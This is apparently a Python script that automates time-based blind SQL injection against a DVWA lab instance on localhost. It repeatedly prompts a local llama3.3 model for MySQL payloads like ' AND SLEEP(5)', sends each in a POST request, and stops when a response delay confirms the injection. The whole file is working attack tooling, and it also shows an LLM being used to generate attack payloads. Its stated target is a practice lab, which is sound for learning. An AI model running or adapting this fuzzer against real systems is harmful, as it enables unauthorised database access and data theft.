from ollama import chat
import requests
import time


"""
This file is working and will continue to loop through sql injection payloads till it finds one that sleeps 5 seconds.
Need to add more fuzz points.  Works on DVAW on 'medium' with a POST Request.
"""


def generate_sql_injection_payload(url_endpoint):
    # Prepare the prompt asking for a SQL injection payload
    sleep_variant = " AND SLEEP(5)"
    prompt = f"Can you provide me a different sql injection like this {sleep_variant} payload for mysql in the 'id' parameter in the following URL: {url_endpoint}? Only return the payload, no other text or markdown please."

    # Model Setup/Config
    messages = [
        {
            'role': 'tool',
            'content': prompt
        }
    ]

    response = chat(
        model="llama3.3",  
        messages=messages
    )

    payload = response['message']['content'] 
    
    return payload

def requester(url_endpoint, data):

    cookies = {
        'security':'medium',
        'PHPSESSID':'581b25fa353038edda12bf865490647b'
    }
    proxies = {
        "http": "http://172.22.96.1:8080",
        "https": "http://172.22.96.1:8080",
    }
    headers = {
        "Content-Type":"application/x-www-form-urlencoded",
    }

    try:
        r = requests.post(url_endpoint, data=data, cookies=cookies, headers=headers)
        return r
    
    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")
        return False    

def main():
    #url_endpoint = "http://localhost/vulnerabilities/sqli" 
    url_endpoint = "http://localhost/vulnerabilities/sqli_blind/"
    try:
        while True:
            sql_payload = generate_sql_injection_payload(url_endpoint)
            data = f"id=1 {sql_payload}&Submit=Submit"

            start_time = time.perf_counter()
            r = requester(url_endpoint, data)
            end_time = time.perf_counter()
            elapsed_time = end_time - start_time
            formatted_time = f"{elapsed_time:.2f}"
            print(f"{formatted_time} {url_endpoint} {data}")
            
            if elapsed_time >= 5:
                break
        print(f"[+] SQL Injection Found! {url_endpoint}") 
            

    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")

if __name__ == "__main__":
    begin_runtime = time.time()
    main()
    end_runtime = time.time()
    runtime = end_runtime - begin_runtime
    print(f"Runtime: {runtime:.2f}") # two decimal places
